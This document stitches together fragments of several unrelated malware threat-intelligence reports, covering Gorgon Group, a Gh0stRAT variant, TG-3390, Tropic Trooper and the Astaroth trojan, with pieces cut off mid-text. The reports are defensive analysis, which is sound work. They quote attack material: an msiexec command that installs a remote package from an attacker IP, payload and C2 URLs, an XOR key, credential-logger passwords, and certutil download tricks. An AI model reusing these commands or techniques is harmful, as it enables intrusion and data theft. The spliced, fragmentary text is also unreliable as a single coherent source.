\u201cPurchase Order\u201d and \u201cSWIFT\u201d lures Most of the filenames included a variance of filenames like:  SWIFT {Date}.doc SWIFT COPY.doc PURCHASE ORDER {Random Value}.doc DHL_RECEIPT {Random Value}.doc SHIPPING RECEIPT {Date}.doc  The tools used by the crew do not really differ in general crime vs more targeted attacks, in both instances they related to several remote access and data stealing malware families The top five malware families identified as criminal in nature so far have been the following:  NjRAT: NjRAT is a remote-access Trojan commonly used and witnessed in attacks that are both criminal and targeted attacks since as early as 2013 RevengeRAT : RevengeRAT is a remote-access Trojan that was released for free on underground forums in 2016 While RevengeRAT could be used in targeted attack campaigns, it is commonly witnessed in criminal malspam campaigns LokiBot: LokiBot is a commodity malware sold on underground sites which is designed to steal private data from infected machines, and then submit that info to a command and control host via HTTP POST RemcosRAT: RemcosRAT is a remote-access Trojan that first appeared in underground forums in July of 2016 The RemcosRAT has a feature-rich builder, which allows for the creation of Microsoft Word documents with malicious macros NanoCoreRAT: Generally delivered via phishing, NanocoreRAT is a remote-access Trojan that opens a back door and steals information from the compromised computer One interesting note about the criminal activity of Gorgon Group is their usage of Bitly Similar to that of their targeted attacks, Gorgon Group leveraged Bitly for distribution and shortening of C2 domains Using the same techniques across both their criminal and targeted activity, made it easier for us to cluster Gorgon Group infrastructure and activity Figure 14 Clicks on Bitly links in criminal attacks Overall, in spite of the lack of sophistication in Gorgon Group\u2019s activity, they were still relatively successful; once again proving that simple attacks on individuals without proper protections, work Intention #2: Targeted Attacks Beginning in early March 2018, Unit 42 started observing targeted attacks against Russian, Spanish and United States government agencies operating in Pakistan As we continued to investigate, it became apparent that Gorgon Group had been consistently targeting worldwide governmental organizations operating within Pakistan While Gorgon Group has been making minor changes in their methodologies, they are still actively involved in both targeted and criminal attacks This Gorgon Group campaign leveraged spear phishing emails with Microsoft Word documents exploiting CVE-2017-0199 The spear phishing emails involved in this campaign would most often originate from Gmail accounts masquerading as legitimate individuals, such as a prominent Lt Col in the Pakistani military The subjects of the spear phishing emails were also interesting, often contained subject matter related to terrorist groups, military activity, or political topics Acting FOREIGN Minister of Pakistan Invitation to lady wives of H.E Ambassador/High Commissioner from lady wife of H.E The popular NanoCoreRAT, QuasarRAT, and NJRAT variants were used heavily In a number of these attacks, the popular third-party URL shortening service Bitly was used to ultimately deliver the payloads for these attacks So, while having this click information is valuable, it\u2019s only one small piece of a larger picture related to targeting Figure 15 Bitly Click Information Related to a Gorgon Group C2 Domain The heaviest concentration of Bitly URL interaction came from Pakistan, which at 410 clicks accounted for 39% of all clicks The United States amassed 194 clicks, accounting for 19% Figure 16 Clicks on Bitly links in targeted attacks The attacks took place primarily in March, late April, and early May of this year Conclusion Gorgon Group isn\u2019t the first actor group we\u2019ve witnessed dabble in both nation state level and criminal attacks What makes Gorgon Group unique is, that despite the group\u2019s operational security failures, they still remained particularly effective Looking closer at the actors participating in Gorgon Group gave us a unique perspective into the inner workings of an attack Leveraging the same infrastructure for targeted attacks and criminal enterprises made for an interesting cross-section of mixed intentions Ultimately, this lead us to the conclusion that several of Gorgon Group\u2019s members have a nexus in Pakistan While Gorgon Group remains active, Palo Alto Networks customers are protected from this threat in the following ways:  WildFire detects all current Gorgon Group files with malicious verdicts AutoFocus customers can track these samples with the Gorgon Group actor tag In some instances, we have also seen the RemcosRAT malware family delivered as the final payload The infection process not only downloads and executes a payload, but it also downloads and opens a decoy document to lower the recipient\u2019s suspicions of the entire process Additionally, the process attempts to lower the overall security of the system by disabling security features in Microsoft Office and Windows Defender The payloads themselves are rather interesting, as the developer wraps the malicious code with legitimate source code freely available online This blanket approach to kill the appropriate process suggests that the actor does not change this command within their macro across delivery documents they created within these Microsoft Office applications The command does not just attempt to kill the Windows Defender process, but also attempts to clear the detection definitions to not trigger an antivirus alert It appears the author of this downloader used the source code from an open source tool called \u201cSales System Application\u201d, which is freely available at hxxp://www.a1vbcode[.]com/app-2999.asp We believe the author of the downloader uses this Sales System Application to provide a legitimate look to their malicious payload The malware author adds their own code to the application to run their malicious code before calling the legitimate functions that display the graphical user interface The ETransaksi.gsgjIDJIGJIGJIGJIFDOSpl method obtains a resource named \u201cfgjfaieSDFAOKEfj.GSrdofjksrgj\u201d, which is decrypted in the ETransaksi.FJaioefgkaoeK method using a multibyte XOR cipher with the following key:byte[] array = new byte[]     {         19,         129,         43,         37,         56,         65,         255,         75,         111,         19,         211,         120,         0,         49,         126,         248     };The resulting cleartext is another .NET assembly, which the payload will load within its own process space An unknown programmatic builder tool appears to have created this Trojan, as the code shows multiple configuration options for additional functionality that were not enabled within this specific sample While the Trojan was configured to carry out this activity, the actor did not embed a payload within the \u201cB\u201d resource, so this functionality does not carry out any activities, rather it just causes an exception and continues running Another configuration option encountered by this Trojan is a check for \u2018%STARTUPON%\u2019 This sample was not configured to execute with this option enabled, however, should this option be enabled, the Trojan would attempt to install itself to the system at a specific location by writing its contents in base64-encoded format to the following file: \u00a0 %APPDATA%\\Microsoft\\Windows\\DsvHelper\\%DECRY%.txt \u00a0 The Trojan then reads the contents of the %DECRY%.txt file, decode them and write the decoded data to the following file: %USERPROFILE%\\APPDATA\\Roaming\\Microsoft\\Windows\\DsvHelper\\@RANDOM@.exe The Trojan would then create a new process using the @RANDOM@.exe file The embedded payload written to process memory exists in the \u201cR\u201d resource and called function in the new payload is named \u201cRPe.Test.Work\u201d The R payload will create a process using the supplied path using the CreateProcessA API function The payload then finds the base address of the newly created process using the GetThreadContext API function, and then calls NtUnmapViewOfSection to hollow the process Embedded Downloader Trojan The M payload (referenced previously along with the R payload, above) injected and executed within the memory space of the other process is a downloader Trojan This specific downloader appears to have been created using a VB2Exe tool, as the functional code that carries out the downloading functionality exists as a VBScript embedded within the payload The payload extracts this VBScript from a resource and saves it to a file that it extracts from another resource The filename used to save the VBScript is \u201ckhm.vbs\u201d, which is eventually run using \u201cwscript\u201d The payload is downloaded from the following location and saved to \u201c%PUBLIC%\\svchost32.exe\u201d: hxxp://lokipanelhostingpanel[.]gq/work/kh/1s.exe The decoy document is downloaded from hxxp://lokipanelhostingpanel[.]gq/work/kh/1.docx and saved to \u201c%PUBLIC%\\svchost32.docx\u201d When opened, the decoy document shows the following content, which contains the image and copied text from a news article titled \u201cTop civil-military body rejects Nawaz\u2019s controversial statement on Mumbai attacks,\u201d as seen in the following screenshot:  Figure 16 Decoy document downloaded

of the terms used Stage1 - Typically the first contact or entry point for malware.\u00a0 This is the first part of the malware to arrive on a system SMB Malware - Any malware that uses the SMB protocol to spread.\u00a0 SMB is typically used for file sharing between printers and other computers, however in recent years malware authors have been able to leverage this protocol to remotely infect hosts RAT - Remote Access Trojan.\u00a0 This type of malware allows for the complete control of an infected computer Gh0stRAT - An open source RAT used primarily by Chinese actors A more detailed analysis of the standard Gh0stRAT can be found here Despite being a Gh0stRAT sample, this variant is very different than your standard Gh0stRAT sample.\u00a0 One of the most noticeable differences is the use of encryption over the entire TCP segment, as a way for it to evade detection.\u00a0 Additionally, this seems to be a lightweight version of Gh0stRAT, as it only has 12 commands, compared to the 73 for a full Gh0stRAT sample; 3 of those commands are undocumented.\u00a0 Also, unlike most samples that I receive on my honeypot, this sample did not start as a DLL that communicates to a distribution server in order to download the stage1.\u00a0 Instead, dropped on my honeypot was a full exe that served as the dropper Network Traffic Format During my analysis of the sample,\u00a0 I was able to enumerate not only the opcode commands, but also the format of the proprietary protocol, allowing me to send my own commands to the sample.\u00a0 First, just like the Gh0st in the dshell paper from SANS, the decrypted protocol consists of a 5 byte header (ngLGX), a 4byte packet length field, and finally another 4 byte uncompressed length field.\u00a0 This is where the similarity ends as the Opcode and the data are compressed using ZLib, instead of just the data.\u00a0 Additionally, the entire packet is encrypted with an algorithm making visual analysis of the Wireshark data challenging.\u00a0 However, as the packet header is static, you can use the encrypted header as an identifier, like I did in my script.\u00a0 The encrypted header is: \u201c\\xEA\\xEE\\xCC\\xD3\\xB8\u201d and is unchanged throughout the malware\u2019s runthrough Available Opcodes As this sample is more of a lightweight version of Gh0stRAT, it only uses 12 commands,

Threat Intelligence Date: August 5, 2015   Summary  Dell SecureWorks Counter Threat Unit(TM) (CTU) researchers investigated activities associated with Threat Group-3390[1] (TG-3390) Analysis of TG-3390's operations, targeting, and tools led CTU researchers to assess with moderate confidence the group is located in the People's Republic of China The threat actors target a wide range of organizations: CTU researchers have observed TG-3390 actors obtaining confidential data on defense manufacturing projects, but also targeting other industry verticals and attacking organizations involved in international relations The group extensively uses long-running strategic web compromises[2] (SWCs), and relies on whitelists to deliver payloads to select victims In comparison to other threat groups, TG-3390 is notable for its tendency to compromise Microsoft Exchange servers using a custom backdoor and credential logger CTU researchers divided the threat intelligence about TG-3390 into two sections: strategic and tactical Strategic threat intelligence includes an assessment of the ongoing threat posed by the threat group Executives can use this assessment to determine how to reduce risk to their organization's mission and critical assets Tactical threat intelligence is based on incident response investigations and research, and is mapped to the kill chain Computer network defenders can use this information to reduce the time and effort associated with responding to TG-3390 Key points Explanations of how CTU researchers identify attribution and gauge confidence levels are available in the Appendix A CTU researchers assess with moderate confidence that TG-3390 is based in the People's Republic of China CTU researchers have evidence that the threat group compromised U.S and UK organizations in the following verticals: manufacturing (specifically aerospace (including defense contractors), automotive, technology, energy, and pharmaceuticals), education, and legal, as well as organizations focused on international relations Based on analysis of the group's SWCs, TG-3390 operations likely affect organizations in other countries and verticals TG-3390 operates a broad and long-running campaign of SWCs and has compromised approximately 100 websites as of this publication Through an IP address whitelisting process, the threat group selectively targets visitors to these websites After the initial compromise, TG-3390 delivers the HttpBrowser backdoor to its victims The threat actors then move quickly to compromise Microsoft Exchange servers and to gain complete control of the target environment The threat actors are adept at identifying key data stores and selectively exfiltrating all of the high-value information associated with their goal CTU researchers recommend the following practices to prevent or detect TG-3390 intrusions:  Search web log files for evidence of web server scanning using the URIs listed in the Exploitation section and evidence of exfiltration using the User-Agent in the Actions on objective section Require two-factor authentication for all remote access solutions, including OWA Strategic threat intelligence CTU researchers assess the threat posed by a threat group by reviewing intent and capability (see Figure 1) Threat groups pose varying threats to different organizations, and even a very capable group may pose a low threat if it does not have the intent to target a particular organization Figure 1 Threat is based on a threat group's intent and capability (Source: Dell SecureWorks) Intent CTU researchers infer intent by aggregating observations, analyzing a threat group's activity, and placing the information in a wider context CTU researchers assess with high confidence that TG-3390 uses information gathered from prior reconnaissance activities to selectively compromise users who visit websites under its control Most websites compromised by TG-3390 actors are affiliated with five types of organizations around the world:  large manufacturing companies, particularly those supplying defense organizations energy companies embassies in Washington, DC representing countries in the Middle East, Europe, and Asia, likely to target U.S.-based users involved in international relations non-governmental organizations (NGOs), particularly those focused on international relations and defense government organizations  Based on this information, CTU researchers assess that TG-3390 aims to collect defense technology and capability intelligence, other industrial intelligence, and political intelligence from governments and NGOs Attribution To assess attribution, CTU researchers analyze observed activity, third-party reporting, and contextual intelligence For the following reasons, CTU researchers assess with moderate confidence that TG-3390 has a Chinese nexus:  The SWC of a Uyghur cultural website suggests intent to target the Uyghur ethnic group, a Muslim minority group primarily found in the Xinjiang region of China Threat groups outside of China are unlikely to target the Uyghur people TG-3390 uses the PlugX remote access tool The menus for PlugX's server-side component are written exclusively in Standard Chinese (Mandarin), suggesting that PlugX operators are familiar with this language CTU researchers have observed TG-3390 activity between 04:00 and 09:00 UTC, which is 12:00 to 17:00 local time in China (UTC +8) The timeframe maps to the second half of the workday in China The threat actors have used the Baidu search engine, which is only available in Chinese, to conduct reconnaissance activities CTU researchers have observed the threat group obtaining information about specific U.S defense projects that would be desirable to those operating within a country with a manufacturing base, an interest in U.S military capability, or both CTU researchers recognize that the evidence supporting this attribution is circumstantial It is possible that TG-3390 is false-flag operation by a threat group outside of China that is deliberately planting indications of a Chinese origin Capability To assess a threat group's capability, CTU researchers analyze its resources, technical proficiency, and tradecraft Resources TG-3390 has access to proprietary tools, some of which are used exclusively by TG-3390 and others that are shared among a few Chinese threat groups The complexity and continual development of these tools indicates a mature development process TG-3390 can quickly leverage compromised network infrastructure during an operation and can conduct simultaneous intrusions into multiple environments This ability is further demonstrated by analysis of interactions between TG-3390 operators and a target environment CTU researchers found no evidence of multiple operators working simultaneously against a single organization This efficiency of operation (a 1:1 ratio of operator to observed activity) suggests that TG-3390 can scale to conduct the maximum number of simultaneous operations These characteristics suggest that the threat group is well resourced and has access to a tools development team and a team focused on SWCs Technical proficiency TG-3390's obfuscation techniques in SWCs complicate detection of malicious web traffic redirects Malware used by the threat group can be configured to bypass network-based detection; however, the threat actors rarely modify host-based configuration settings when deploying payloads CTU researchers have observed the threat actors installing a credential logger and backdoor on Microsoft Exchange servers, which requires a technical grasp of Internet Information Services (IIS) TG-3390 uses older exploits to compromise targets, and CTU researchers have not observed the threat actors using zero-day exploits as of this publication The threat actors demonstrated the ability to adapt when reentering a network after an eviction, overcoming technical barriers constructed by network defenders Tradecraft In addition to using SWCs to target specific types of organizations, TG-3390 uses spearphishing emails to target specific victims CTU researchers assess with high confidence that the threat actors follow an established playbook during an intrusion They quickly move away from their initial access vector to hide their entry point and then target Exchange servers as a new access vector As of this publication, CTU researchers have not discovered how TG-3390 keeps track of the details associated with its compromised assets and credentials However, the threat actors' ability to reuse these assets and credentials, sometimes weeks or months after the initial compromise, indicates the group is disciplined and well organized After gaining access to a target network in one intrusion analyzed by CTU researchers, TG-3390 actors identified and exfiltrated data for specific projects run by the target organization, indicating that they successfully obtained the information they sought Data exfiltration occurred almost four weeks after the initial compromise and continued for two weeks (see Figure 2) Figure 2 Data exfiltration timeline (Source: Dell SecureWorks)    Note: The adversary's end goal is to exfiltrate, not infiltrate Organizations often miss multiple opportunities to detect and disrupt the threat actors before they can achieve their objective Tactical threat intelligence Known tools CTU researchers have observed TG-3390 actors using tools that are favored by multiple threat groups:  PlugX \u2014 A remote access tool notable for communications that may contain HTTP headers starting with \"X-\" (e.g., \"X-Session: 0\") The malware can be configured to use multiple network protocols to avoid network-based detection HttpBrowser (also known as TokenControl) \u2014 A backdoor notable for HTTPS communications with the HttpBrowser/1.0 User-Agent (see Figure 3) Antivirus detection for HttpBrowser is extremely low and is typically based upon heuristic signatures More information about HttpBrowser is available in Appendix B Figure 3 HttpBrowser URI Figure 4 Hunter \u2014 A web application scanning tool written by @tojen to identify vulnerabilities in Apache Tomcat, Red Hat JBoss Middleware, and Adobe ColdFusion (see Figure 5) It can also identify open ports, collect web banners, and download secondary files Figure 5 Hunter usage It is installed as an ISAPI filter Captured credentials are DES-encrypted using the password \"12345678\" and are written to the log.txt file in the root directory It is deployed to internally accessible servers running Internet Information Services (IIS) Figure 6 Reconnaissance CTU researchers have not observed TG-3390 actors performing reconnaissance prior to compromising organizations As discussed in the Actions on objectives section, the threat actors appear to wait until they have established a foothold Development TG-3390 actors use command and control (C2) domains for extended periods of time but frequently change the domains' IP addresses The new IP addresses are typically on the same subnet as the previous ones TG-3390 is capable of using a C2 infrastructure that spans multiple networks and registrars The most common registrar used by the adversary is HiChina Zhicheng Technology Ltd The threat actors have a demonstrated ability to move from one network provider to another, using some infrastructure for extended periods of time and other domains for only a few days Seemingly random activity patterns in infrastructure deployment and usage, along with the ability to use a wide variety of geographically diverse infrastructure, help the threat actors avoid detection TG-3390 SWCs may be largely geographically independent, but the group's most frequently used C2 registrars and IP net blocks are located in the U.S Using a U.S.-based C2 infrastructure (see Figure 7) to compromise targets in the U.S helps TG-3390 actors avoid geo-blocking and geo-flagging measures used in network defense Figure 7 Geolocation of TG-3390 infrastructure observed by CTU researchers The dark green signifies a high count of C2 registrars and IP net blocks, while the light green represents a smaller count (Source: Dell SecureWorks) The threat actors create PlugX DLL stub loaders that will run only after a specific date The compile dates of the samples analyzed by CTU researchers are all later than the hard-coded August 8, 2013 date, indicating that the code might be reused from previous tools Weaponization As of this publication, CTU researchers are unsure if TG-3390 relies on weaponizers to package tools and exploits The ZIP archives have names relevant to the targets and contain both legitimate files and malware Figure 8 Decoy image Figure 9 SWC code Figure 10 Unpacked JavaScript code The threat actors have evolved to whitelisting IP addresses and only delivering the exploit and payload to specific targets of interest CTU researchers have observed TG-3390 compromising a target organization's externally and internally accessible assets, such as an OWA server, and adding redirect code to point internal users to an external website that hosts an exploit and delivers malware Exploitation TG-3390 actors have used Java exploits in their SWCs In activity analyzed by CTU researchers, TG-3390 executed the Hunter web application scanning tool against a target server running IIS CTU researchers have observed the threat actors employing legitimate Kaspersky antivirus variants in analyzed samples The DLL acts as a stub loader, which loads and executes the shell code The adversaries have used this technique to allow PlugX and HttpBrowser to persist on a system The challenge is detecting known good software loading and running malware The IIS w3wp.exe process loads the malicious DLL, which CTU researchers have observed in the Program Files\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\Bin directory The PlugX malware can be configured to use HTTP, DNS, raw TCP, or UDP to avoid network-based detection In one sample analyzed by CTU researchers, PlugX was configured with hard-coded user credentials to bypass a proxy that required authentication When the adversaries' operations are live, they modify the record again to point the C2 domain to an IP address they can access A domain name parking example is available in Appendix D Actions on objective CTU researchers have discovered numerous details about TG-3390 operations, including how the adversaries explore a network, move laterally, and exfiltrate data Within six hours of entering the environment, the threat actors compromised multiple systems and stole credentials for the entire domain Figure 11 Timeline, in Eastern Time, of TG-3390's initial entry into a victim's network (Source: Dell SecureWorks) The threat actors use the Hunter and nbtscan tools, sometimes renamed, to conduct network reconnaissance for vulnerable servers and online systems (see Figure 12) Figure 12 nbtscan batch script (renamed ipcan.exe) used to profile network CTU researchers observed the threat actors collecting Cisco VPN profiles to use when accessing the victim's network via VPN (see Figure 13) Figure 13 Copying of .pcf files CTU researchers have observed the threat actors encrypting data using the password \"admin-windows2014\" and splitting the RAR archives into parts in the recycler directory, with the same name as the uncompressed data (see Figure 14) Figure 14 Batch script used to archive data (Source: Dell SecureWorks) The number at the end of the password corresponds to the year of the intrusion For example, the password \"admin-windows2014\" shown in Figure 14 was changed to \"admin-windows2015\" for TG-3390 intrusions conducted in 2015 In some instances, adversaries exceed disk space limits during the exfiltration process, requiring the staging of archives on multiple systems Unexplained disk quota alerts on typically underutilized systems warrants immediate investigation Figure 15 Batch script used to rename exfiltrated data (Source: Dell SecureWorks) CTU researchers have observed TG-3390 actors staging RAR archives, renamed with a .zip file extension, on externally accessible web servers The adversaries then issue HTTP GET requests, sometimes with the User-Agent MINIXL, to exfiltrate the archive parts from the victim's network (see Figure 16) Figure 16 Example GET request from IIS log (Source: Dell SecureWorks) In other intrusions, data was exfiltrated using the PlugX remote access tool Figure 17 shows network data transfer sizes for a month-long period beginning with TG-3390's re-entry into a network Approximately 300 GB of data was exfiltrated during that span Figure 17 Network data transfer sizes to C2 servers after TG-3390 reentry into a network (Source: Dell SecureWorks) CTU observations Figure 18 is a UTC time wheel depicting which hours the threat actors actively operated in one target environment during a three-day intrusion observed by CTU researchers The concentric bands represent the days of the week, with Saturday as the outside band and Sunday as the innermost band, and each cell represents an hour The darker the cell color, the higher the activity level; white indicates no observed activity TG-3390 was most active between 04:00 and 09:00 UTC Figure 18 The legend across the bottom of the figure lists the upper bound of interactions that are represented by each color variation on the wheel Times are based on UTC (Source: Dell SecureWorks) Response to eviction Successfully evicting TG-3390 from an environment requires a coordinated plan to remove all access points, including remote access tools and web shells Within weeks of eviction, the threat actors attempt to access their ChinaChopper web shells from previously used IP addresses Finding the web shells inaccessible, the adversaries search google.co.jp for remote access solutions CTU researchers discovered the threat actors searching for \"[company] login,\" which directed them to the landing page for remote access CTU researchers believe legitimate websites are used to host tools because web proxies categorize the sites as benign Note: Numerous threat groups use legitimate remote access solutions (VPN, Citrix, OWA, etc.) to enter or reenter a network After executing an eviction plan, it is paramount to reset all credentials, including those for third-party accounts, preferably after implementing two-factor authentication After reentering an environment, the threat actors focus on obtaining the active directory contents Figure 19 shows a timeline of TG-3390 attempting to regain a foothold in a network in a span of only five hours Figure 19 Timeline, in Eastern Time, of TG-3390's reentry into a compromised network (Source: Dell SecureWorks)     Note: Relying primarily on network-based security controls will not deter most threat groups from achieving their objective Adversaries can overcome blacklisted infrastructure in minutes, as TG-3390 actors did when they staged tools on compromised web servers Figure 20 Figure 21 (Source: Dell SecureWorks) CTU researchers have no evidence to determine if these tools are also used by TG-3390 Conclusion TG-3390 is known for compromising organizations via SWCs and moving quickly to install backdoors on Exchange servers Despite the group's proficiency, there are still many opportunities to detect and disrupt its operation by studying its modus operandi The threat actors work to overcome existing security controls, or those put in place during an engagement, to complete their mission of exfiltrating intellectual property Due to TG-3390's determination, organizations should formulate a solid eviction plan before engaging with the threat actors to prevent them from reentering the network Threat indicators The indicators in Table 1 are associated with TG-3390 activity The domains and IP addresses may contain malicious content, so consider the risks before opening them in a browser TG-3390 indicators Appendix A \u2014 Identifying attribution and gauging confidence Identifying attribution In most cases, CTU researchers not have intelligence to directly attribute a threat group, so attribution relies on circumstantial evidence and is an assessment rather than a fact CTU researchers draw on three distinct intelligence bases for evidence of attribution:  Observed activity is gathered from CTU researchers' observation and investigation of a threat group's activity on a target network and across Dell SecureWorks data, and analysis of tactics, techniques, and procedures (TTPs) the threat group employs Third-party intelligence is gained from trusted relationships within the security industry and with other private and public sector organizations, as well as analysis of open source intelligence Contextual analysis compares threat group targets against intelligence requirements of nation states and other threat actors and compares tradecraft employed by a threat group to tradecraft of known threat actors Gauging confidence level CTU researchers have adopted the grading system published by the U.S Office of the Director of National Intelligence to indicate confidence in their assessments:  High confidence generally indicates that judgments are based on high-quality information, and/or that the nature of the issue makes it possible to render a solid judgment A \"high confidence\" judgment is not a fact

or corroborated sufficiently to warrant a higher level of confidence Appendix B \u2014 HttpBrowser analysis HttpBrowser is a remote access tool whose name originates from the hard-coded \"HttpBrowser/1.0\" User-Agent CTU researchers also identified a PDB string in the binaries, J:\\TokenControlV3\\ServerDll\\Release\\ServerDll.pdb, which implies that the threat actors may refer to the tool as \"TokenControl.\" Table 2 lists the commands available to threat actors in one of the HttpBrowser variants HttpBrowser command set (Source: Dell SecureWorks) Other variants of the backdoor may include additional commands such as setcmd, settime, uninstall, and down Table 3 shows the unencrypted URL parameters, along with sample data and a description of the data HttpBrowser parameters Like ChinaChopper, it parses HTTP requests for the Z1 and Z2 parameters (see Table 4) In addition to acting as a web shell, the malware captures and DES-encrypts credentials before writing the username and password to disk The DES key to encrypt the credentials in the configuration observed by CTU researchers is 12345678, and the log file is c:\\log.txt Figure 22 Table 5 demonstrates how

Tropic Trooper (also known as KeyBoy) levels its campaigns against Taiwanese, Philippine, and Hong Kong targets, focusing on their government, healthcare, transportation, and high-tech industries Its operators are believed to be very organized and develop their own cyberespionage tools that they fine-tuned in their recent campaigns Many of the tools they use now feature new behaviors, including a change in the way they maintain a foothold in the targeted network Attack Chain  Figure 1 Download an installer package (.msi) and install it on the system by executing the command: /c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]) The backdoor installer will drop a normal sidebar.exe file (a Windows Gadget tool, a feature already discontinued by Windows), a malicious loader (in \u201cC:\\ProgramData\\Apple\\Update\\wab32res.dll\u201c), and an encrypted configuration file The malicious loader will use dynamic-link library (DLL) hijacking \u2014 injecting malicious code into a process of a file/application \u2014 on sidebar.exe and launch dllhost.exe (a normal file) We also observed malicious documents that don\u2019t need to download anything from the internet as the backdoor\u2019s dropper is already embedded in the document This, however, doesn\u2019t influence the overall result for the victim Tropic Trooper uses exploit-laden Microsoft Office documents to deliver malware to targets These documents use job vacancies in organizations that may be deemed socio-politically sensitive to recipients Below is a screenshot of the document used in their latest campaigns:  Figure 2 Figure 3 PDB strings inside the MSI file The first PDB string has a certain ss2/Projects/MsiWrapper (Project MsiWrapper) in it, which we found to be an open-source application that converts executable setup programs to MSI files The second PDB string contains Work, House, and TSSL: we can assume this tool belongs to Tropic Trooper\u2019s TSSL project as seen by other researchers Here it is a new one, as seen in their misspelling of \u201cHorse\u201d to \u201cHouse\u201d (other reports had the string typed correctly) Another interesting PDB string we found is D:\\Work\\Project\\VS\\house\\Apple\\Apple_20180115\\Release\\InstallClient.pdb It would then use sidebar.exe to load the malicious wab32res.dll (TROJ_TCLT.ZDFB) through DLL hijacking This is carried out to evade antivirus (AV) detection, because wab32res.dll is loaded by a benign file Figure 4 The installer drops three files into the Apple/Update directory   Figure 5 PDB strings inside the loader file From the PDB string above, the attackers intended it to be a loader (hence the name FakeRun) and not the actual backdoor The backdoor, TClient (BKDR_TCLT.ZDFB), is so named from its own PDB string Figure 6 Once the loader is executed, it will check the current process (sidebar.exe) whether to load it or not Figure 7 The loader checking the sidebar process  Figure 8 The malicious loader injecting the backdoor into dllhost.exe  Figure 9 Comparison of TClient\u2019s configuration format in 2016 (left, from other researchers) and 2018 (right) TClient will use SSL to connect to Tropic Trooper\u2019s C&C server However, the C&C server and some configuration values are not hardcoded in the backdoor This allows Tropic Trooper\u2019s operators to easily change/update the C&C server and configure other values TClient is actually one of Tropic Trooper\u2019s other backdoors The backdoor noted by other security researchers was encoded with different algorithms and configured with different parameter names in 2016, for instance TClient uses symmetric encryption to decrypt its configuration with one 16-byte key in 2018 TClient will use custom SSL libraries to connect the C&C server We also found another SSL certificate on this C&C server A closer look reveals that it was registered quite recently, and is set to expire after a year, suggesting Tropic Trooper\u2019s use or abuse of components or services that elapse so they can leave as few traces as possible Figure 13 SSL certificate\u2019s validity Following Tropic Trooper\u2019s Trails\u00a0 We further monitored their activities and found three additional and notable PDB strings in their malware:  D:\\Work\\Project\\VS\\HSSL\\HSSL_Unicode _2\\Release\\ServiceClient.pdb D:\\Work\\VS\\Horse\\TSSL\\TSSL_v3.0\\TClient\\Release\\TClient.pdb D:\\Work\\VS\\Horse\\TSSL\\TSSL_v0.3.1_20170722\\TClient\\x64\\Release\\TClient.pdb  These came from open-intelligence platforms and incident response cases These strings shed further light on Tropic Trooper\u2019s operations:  They have another campaign/project named HSSL, which supports Unicode characters The TSSL project has a v3.0 version, indicating the operators can mix and match different versions of their malware, depending on their target The TSSL project has 64-bit version The Need for a Proactive Incident Response Strategy Cyberespionage campaigns are persistent and, as shown by Tropic Trooper, always raring to exploit weaknesses in people and technology For organizations, this highlights the significance of staying ahead of their attackers: detect, analyze, and respond What techniques will they use? How can my organization\u2019s attack surface be reduced? What did I do to respond to the threat \u2014 what worked, what didn\u2019t, and what could be fine-tuned? A proactive incident response strategy provides threat intelligence \u2014 from the endpoint to the network \u2014 that can let IT/system administrators identify malicious activities that aren\u2019t typically visible to traditional security solutions TClient, for instance, uses DLL hijacking and injection that may not be as noticeable to others Its use of the SSL protocol also means it can blend with legitimate traffic Analyzing their PDB strings can also provide a deeper insight into the campaign\u2019s bigger picture Ascertaining the tactics and techniques they use empower organizations in developing robust and actionable indicators of compromise (IoCs) that can act as benchmarks for response Here are some best practices that organizations can adopt:  Keep the system, its applications, and the network updated The vulnerabilities that Tropic Trooper\u2019s campaigns have been patched last January, for instance Enforce a stronger patch management policy, and consider virtual patching for legacy systems Enforce the principle of least privilege: Employ network segmentation and data categorization to deter lateral movement and mitigate further exposure Application control and behavior monitoring block suspicious files and anomalous routines from being installed or executed in the system Disable or secure the use of system administration tools such as PowerShell and other command-line tools that may be abused Actively monitor your perimeter, from gateways and endpoints to networks and servers Firewalls as well as intrusion detection and prevention systems help thwart network-based attacks Nurture a culture of cybersecurity Spear-phishing emails, for instance, rely on baiting targets with socially engineered documents The technologies that help protect the

By\u00a0Jerome Doaty and Garrett Primm The Cofense\u2122 Phishing Defense Center (PDC) has recently defended against a resurgence of Astaroth, with dozens of hits across our customer base in the last week In just one week, some estimated 8,000 machines have been potentially compromised The Astaroth trojan, named for its use of satanic variable names (the \u201cGreat Duke of Hell\u201d in ancient lore), has been around since late 2017 Astaroth is known for infecting victims through fake invoice emails, the majority of which originate from a malicious sender impersonating legitimate services using cam.br domains Fig 1 Impersonating TicketLog This revived campaign has been well planned and supported, exclusively targeting South Americans All the campaign\u2019s URLs are Cloudflare hosted, only delivering their payloads to South American IP addresses and exit 3 WMIC abuse Astaroth retrieves a .php file from this URL containing a style sheet with embedded JavaScript 4 Embedded JS in .xsl After defining several variables, some of which contain ActiveX objects for file execution and manipulation later, the script uses a function to \u201croll\u201d a random number 5 \u201cradador\u201d dice roll function The number selected is then used to select a payload URL from a list Fig 6 Domain list The code frequently reuses the \u201cxVRxastaroth\u201d variable, potentially useful for future fingerprinting All the 154 domains listed were hosted on CloudFlare 7 CloudFlare hosting After the domain has been selected, the payload URL to another stylesheet is loaded using WMIC yet again The domain that is selected will have the hard-coded value of /Seu7v130a.xsl? appended to it as well as a randomly selected number between 1111111 and 9999999 For example: hxxp://ta4dcmj[.]proxy6x-server[.]website/09//Seu7v130a[.]xsl?3314468[.]xsl This payload contains much more embedded JavaScript and is part of the core functionality of the malware delivery The same variables that are declared in the initial stylesheet are reused here, including the RNG roller for a payload domain The script creates a function that will run the copied certutil in the temp folder with parameters -urlcache and the options -f and -split This will cache a force fetched URL and save the fetched URL to a file 9 Caching URLs and downloading payloads This function is used repeatedly to retrieve the rest of the malware payload A check is also performed to ensure each file has been downloaded to the correct folder before proceeding 12 The trojan is complete A database of victims After the malware is successful in infecting a host it will generate a plaintext log (r1.log) located in the tempwl directory 13 Victim logging This information is then sent to a sqlite database located in the root directory of the first payload URL as seen in the snippet below There were multiple open directories in ~/9/ Decrementing the number to 0 revealed several other open directories with downloadable sqlite databases, more than likely from previous campaigns These victims totaled in the thousands, with approximately 8,000 in a single week 14 Open directory\u2026 Here is one of the databases viewed in a sqlite browser Each field is base64 decoded Note the first entry of a machine hosted on a Canadian VPS This was the first entry across every database dump gathered and was certainly an anomaly compared to the otherwise South American machines, the primary target of this malware It\u2019s difficult to say for sure, but this was possibly the threat actor testing his infrastructure 16 Potentially infected machines\u00a0 The Malware After the Astaroth trojan verifies that each core file and binary has been run, the malware payload is executed It is important to note that any payload could be delivered via WMIC stylesheet abuse, and Astaroth should be considered a versatile delivery method However, their magic 